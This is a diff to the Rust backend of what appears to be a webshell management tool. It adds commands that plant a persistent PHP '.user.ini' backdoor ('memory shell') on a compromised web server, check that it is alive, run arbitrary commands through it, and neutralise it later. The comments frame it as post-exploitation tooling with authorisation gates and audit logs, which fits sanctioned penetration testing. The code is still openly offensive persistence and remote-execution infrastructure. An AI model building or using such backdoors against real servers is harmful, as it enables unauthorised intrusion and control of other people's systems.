@@ -7,9 +7,9 @@ use url::Url;
 use dosword_sdk::domain::{
     AppSettings, AuditFilter, AuditPage, CommandOutput, ConnectResult, CreateShell,
     CreateWorkspace, Dashboard, DbConnection, DbProbeResult, DbQueryResult, DirListing, FileChunk,
-    FileContent, GenerateShellResult, HttpSendResult, ImportResult, ProbeResult, ProtocolMeta,
-    ProxyTestResult, RequestRecord, SessionInfo, ShellProfile, UpdateShell, UpdateWorkspace,
-    Workspace,
+    FileContent, GenerateShellResult, HttpSendResult, ImportResult, MemoryShell,
+    MemshellCapability, ProbeResult, ProtocolMeta, ProxyTestResult, RequestRecord, SessionInfo,
+    ShellProfile, UpdateShell, UpdateWorkspace, Workspace,
 };
 use dosword_sdk::encoder::{EncoderRegistry, STUB_LANGUAGES};
 use dosword_sdk::plugin::FeaturePlugin;
@@ -3210,6 +3210,319 @@ pub async fn mcp_resolve_approval(
 // 命令层测试：直接构造 AppState（内存库 + 会话管理器 + 内置协议），
 // 验证统一流程：会话上下文解析、授权门、锁外执行。
 // ---------------------------------------------------------------------------
+
+// ---------------------------------------------------------------------------
+// 内存马（后渗透）。所有会改变目标状态的路径都必须：授权门 → 审计 → 可卸载。
+// ---------------------------------------------------------------------------
+
+/// 查询当前目标支持的内存马形态（纯本地判定，零网络请求）。
+#[tauri::command]
+pub async fn memshell_capabilities(
+    session_id: String,
+    app: AppHandle,
+) -> Result<Vec<MemshellCapability>, String> {
+    blocking(app, move |state| {
+        let info = {
+            let mut sessions = state
+                .sessions
+                .lock()
+                .map_err(|_| "会话锁异常".to_string())?;
+            sessions.get_mut(&session_id)?.info.clone()
+        };
+        let verdict = crate::memshell::php_user_ini_preconditions(&info);
+        Ok(vec![MemshellCapability {
+            kind: crate::memshell::KIND_PHP_USER_INI.to_string(),
+            runtime: "php".to_string(),
+            feasible: verdict.is_ok(),
+            reason: verdict.err(),
+        }])
+    })
+    .await
+}
+
+/// 注入 PHP `.user.ini` 内存马。
+#[tauri::command]
+pub async fn memshell_install(
+    session_id: String,
+    install_dir: String,
+    trigger_url: String,
+    app: AppHandle,
+) -> Result<MemoryShell, String> {
+    blocking(app, move |state| {
+        let ctx = session_ctx(state, &session_id)?;
+        if !ctx.settings.http_enabled {
+            return Err("真实网络协议未开启，禁止注入内存马".to_string());
+        }
+        let (session, info) = {
+            let mut sessions = state
+                .sessions
+                .lock()
+                .map_err(|_| "会话锁异常".to_string())?;
+            let session = sessions.get_mut(&session_id)?;
+            (session.state.clone(), session.info.clone())
+        };
+        crate::memshell::php_user_ini_preconditions(&info)?;
+
+        let shell_id = ctx.shell.id.clone();
+        let workspace_id = ctx.shell.workspace_id.clone();
+        {
+            let existing = state
+                .database
+                .lock()
+                .map_err(|_| "数据库锁异常".to_string())?
+                .list_memory_shells(None, Some(&shell_id))
+                .map_err(|error| error.to_string())?;
+            if crate::memshell::has_orphan(&existing) {
+                return Err("该目标存在无法卸载的内存马残留，请先人工清理后再注入".to_string());
+            }
+        }
+
+        let token = uuid::Uuid::new_v4().simple().to_string();
+        let name = format!("m{}", &token[..8]);
+        let artifact = crate::memshell::php::install(
+            ctx.protocol,
+            session.as_ref(),
+            &ctx.settings,
+            install_dir.trim(),
+            &name,
+            &token,
+        )
+        .map_err(|error| format!("注入失败：{error}"))?;
+
+        // .user.ini 有 cache_ttl 延迟（默认 300s）：未立即生效时标 pending，
+        // 而不是报失败 —— 用户可稍后点「检测」。
+        let alive = crate::memshell::php::check(&ctx.settings, &trigger_url, &token, &name);
+        let now = chrono::Utc::now().to_rfc3339();
+        let handle = MemoryShell {
+            id: uuid::Uuid::new_v4().to_string(),
+            workspace_id: workspace_id.clone(),
+            shell_id: Some(shell_id.clone()),
+            runtime: "php".to_string(),
+            kind: crate::memshell::KIND_PHP_USER_INI.to_string(),
+            name,
+            token,
+            endpoint: trigger_url.clone(),
+            install_path: artifact.payload_path.clone(),
+            artifact: serde_json::to_string(&artifact).map_err(|error| error.to_string())?,
+            status: if alive { "active" } else { "pending" }.to_string(),
+            installed_at: now.clone(),
+            last_check_at: if alive { Some(now) } else { None },
+            last_check_ok: alive,
+            uninstall_attempts: 0,
+            notes: if alive {
+                String::new()
+            } else {
+                "尚未生效：目标 PHP 会缓存 .user.ini（user_ini.cache_ttl，默认 300s），请稍后重试检测"
+                    .to_string()
+            },
+        };
+        {
+            let database = state
+                .database
+                .lock()
+                .map_err(|_| "数据库锁异常".to_string())?;
+            database
+                .insert_memory_shell(&handle)
+                .map_err(|error| error.to_string())?;
+            database
+                .record_audit(
+                    Some(&workspace_id),
+                    Some(&shell_id),
+                    "memshell.inject",
+                    if alive { "success" } else { "pending" },
+                    &format!(
+                        "形态：{}；路径：{}；端点：{trigger_url}",
+                        handle.kind, handle.install_path
+                    ),
+                )
+                .map_err(|error| error.to_string())?;
+        }
+        Ok(handle)
+    })
+    .await
+}
+
+/// 存活检测。可反复调用（`pending` 状态会因 TTL 过期而转为 active）。
+#[tauri::command]
+pub async fn memshell_check(handle_id: String, app: AppHandle) -> Result<bool, String> {
+    blocking(app, move |state| {
+        let (handle, settings) = {
+            let database = state
+                .database
+                .lock()
+                .map_err(|_| "数据库锁异常".to_string())?;
+            let handle = database
+                .memory_shell(&handle_id)
+                .map_err(|error| error.to_string())?
+                .ok_or_else(|| format!("内存马句柄不存在：{handle_id}"))?;
+            let settings = database.get_settings().map_err(|error| error.to_string())?;
+            (handle, settings)
+        };
+        if !settings.http_enabled {
+            return Err("真实网络协议未开启，无法检测".to_string());
+        }
+        let alive =
+            crate::memshell::php::check(&settings, &handle.endpoint, &handle.token, &handle.name);
+        let status = if alive {
+            "active".to_string()
+        } else if handle.status == "orphaned" {
+            "orphaned".to_string()
+        } else {
+            "stale".to_string()
+        };
+        {
+            let database = state
+                .database
+                .lock()
+                .map_err(|_| "数据库锁异常".to_string())?;
+            database
+                .update_memory_shell_check(&handle.id, &status, alive)
+                .map_err(|error| error.to_string())?;
+            database
+                .record_audit(
+                    Some(&handle.workspace_id),
+                    handle.shell_id.as_deref(),
+                    "memshell.check",
+                    if alive { "success" } else { "failed" },
+                    &format!("句柄：{}；状态：{status}", handle.id),
+                )
+                .map_err(|error| error.to_string())?;
+        }
+        Ok(alive)
+    })
+    .await
+}
+
+/// 中和内存马（改写为无害占位 + 摘除 `.user.ini`）。
+///
+/// **不删除载荷文件**：目标 PHP 会缓存 `.user.ini` 的 prepend 路径，
+/// 文件缺失会让站点在 TTL 内每个请求 500（已实测）。
+#[tauri::command]
+pub async fn memshell_uninstall(handle_id: String, app: AppHandle) -> Result<String, String> {
+    blocking(app, move |state| {
+        let (handle, settings) = {
+            let database = state
+                .database
+                .lock()
+                .map_err(|_| "数据库锁异常".to_string())?;
+            let handle = database
+                .memory_shell(&handle_id)
+                .map_err(|error| error.to_string())?
+                .ok_or_else(|| format!("内存马句柄不存在：{handle_id}"))?;
+            let settings = database.get_settings().map_err(|error| error.to_string())?;
+            (handle, settings)
+        };
+        let outcome =
+            crate::memshell::php::uninstall_via_payload(&settings, &handle.endpoint, &handle.token);
+        let database = state
+            .database
+            .lock()
+            .map_err(|_| "数据库锁异常".to_string())?;
+        match outcome {
+            Ok(()) => {
+                database
+                    .update_memory_shell_check(&handle.id, "neutered", false)
+                    .map_err(|error| error.to_string())?;
+                database
+                    .record_audit(
+                        Some(&handle.workspace_id),
+                        handle.shell_id.as_deref(),
+                        "memshell.uninstall",
+                        "success",
+                        &format!(
+                            "句柄：{}；载荷已中和，待 user_ini.cache_ttl 过后可删除 {}",
+                            handle.id, handle.install_path
+                        ),
+                    )
+                    .map_err(|error| error.to_string())?;
+                Ok(
+                    "载荷已中和；为免目标站点在缓存窗口内 500，文件暂留，请在 TTL 后清理"
+                        .to_string(),
+                )
+            }
+            Err(error) => {
+                database
+                    .mark_memory_shell_uninstall_failed(&handle.id, "orphaned", &error)
+                    .map_err(|inner| inner.to_string())?;
+                database
+                    .record_audit(
+                        Some(&handle.workspace_id),
+                        handle.shell_id.as_deref(),
+                        "memshell.uninstall",
+                        "failed",
+                        &format!("句柄：{}；{error}", handle.id),
+                    )
+                    .map_err(|inner| inner.to_string())?;
+                Err(format!("中和失败，句柄已标记为 orphaned：{error}"))
+            }
+        }
+    })
+    .await
+}
+
+/// 列出内存马句柄（可按 Workspace / Shell 过滤）。
+#[tauri::command]
+pub async fn memshell_list(
+    workspace_id: Option<String>,
+    shell_id: Option<String>,
+    app: AppHandle,
+) -> Result<Vec<MemoryShell>, String> {
+    blocking(app, move |state| {
+        state
+            .database
+            .lock()
+            .map_err(|_| "数据库锁异常".to_string())?
+            .list_memory_shells(workspace_id.as_deref(), shell_id.as_deref())
+            .map_err(|error| error.to_string())
+    })
+    .await
+}
+
+/// 经内存马执行命令（验证通道可用 / 临时取用）。
+#[tauri::command]
+pub async fn memshell_exec(
+    handle_id: String,
+    command: String,
+    app: AppHandle,
+) -> Result<String, String> {
+    blocking(app, move |state| {
+        let (handle, settings) = {
+            let database = state
+                .database
+                .lock()
+                .map_err(|_| "数据库锁异常".to_string())?;
+            let handle = database
+                .memory_shell(&handle_id)
+                .map_err(|error| error.to_string())?
+                .ok_or_else(|| format!("内存马句柄不存在：{handle_id}"))?;
+            let settings = database.get_settings().map_err(|error| error.to_string())?;
+            (handle, settings)
+        };
+        if !settings.http_enabled {
+            return Err("真实网络协议未开启".to_string());
+        }
+        let output =
+            crate::memshell::php::exec(&settings, &handle.endpoint, &handle.token, &command)?;
+        state
+            .database
+            .lock()
+            .map_err(|_| "数据库锁异常".to_string())?
+            .record_audit(
+                Some(&handle.workspace_id),
+                handle.shell_id.as_deref(),
+                "memshell.exec",
+                "success",
+                &format!(
+                    "句柄：{}；命令：{}",
+                    handle.id,
+                    truncate_chars(&command, 200)
+                ),
+            )
+            .map_err(|error| error.to_string())?;
+        Ok(output)
+    })
+    .await
+}
 
 #[cfg(test)]
 mod tests {
